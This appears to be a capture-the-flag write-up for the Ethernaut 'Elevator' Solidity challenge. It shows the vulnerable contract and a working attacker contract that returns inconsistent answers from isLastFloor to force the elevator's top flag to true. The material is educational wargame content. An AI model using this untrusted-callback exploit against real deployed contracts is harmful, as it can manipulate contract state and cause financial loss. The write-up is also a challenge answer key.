# Type - Beyond the console

This elevator won't let you reach the top of your building. Right?

Things that might help:
Sometimes solidity is not good at keeping promises.
This Elevator expects to be used from a Building.

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}


contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

***

# Solution
1. Get a new instance
2. The goal is to reach the top floor, now  we can see that if we can call the isLastFloor twice we can achieve our goal
3. Lets create a new contract which implements the interface of Building contract, also make a supporting function that calls the goTo() function and makes sure we reach the top
4. The first call in the isLastFloor must amount to false and the next call should be true to pass this level, we can keep track of how many times the isLastFloor() function was called by using a state variable and achieve the required goal

```
contract Hack {
  Elevator private immutable target;
 uint private count;

  constructor(address _target){
    target = Elevator(_target);
  }

  function isLastFloor(uint) external returns(bool){
    count++;
    return count > 1;
  }

  function triggerHack() external  {
    target.goTo(1);
    require(target.top(),"not top");
  }
}
```
